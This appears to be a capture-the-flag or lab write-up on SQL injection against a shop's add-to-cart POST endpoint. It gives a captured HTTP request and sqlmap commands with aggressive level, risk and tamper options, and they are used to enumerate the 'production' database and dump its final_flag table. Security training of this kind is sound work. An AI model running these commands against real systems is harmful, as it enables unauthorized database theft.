
Looking for a POST request, the action/page that gives me one is adding an item to my shopping cart. This gives me an ID of 1:
![[Pasted image 20260718142007.png]]


![[Pasted image 20260718154311.png]]

Save the request header information in a file called `request.req`. I had to put the id at the end of the file:
```go
POST /action.php HTTP/1.1
Host: 154.57.164.82:32482
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 8
Origin: http://154.57.164.82:32482
Connection: keep-alive
Referer: http://154.57.164.82:32482/shop.html
Priority: u=0

{"id":1}
```

Get information about the database in use:
```go
sqlmap -r request.req --batch --dump --level=5 --risk=3 --random-agent --tamper=between
```

Os:
```go
Linux Debian 10
```

Web App
```go
Apache 2.4.38
```

Database Name:
```go
production
```

Number of tables:
```go
5
```

![[Pasted image 20260718152216.png]]

Dump the final_flag table:
```go
sqlmap -r request.req --batch --dump --level=5 --risk=3 --random-agent --tamper=between -D production -T final_flag
```

Flag
![[Pasted image 20260718153207.png]]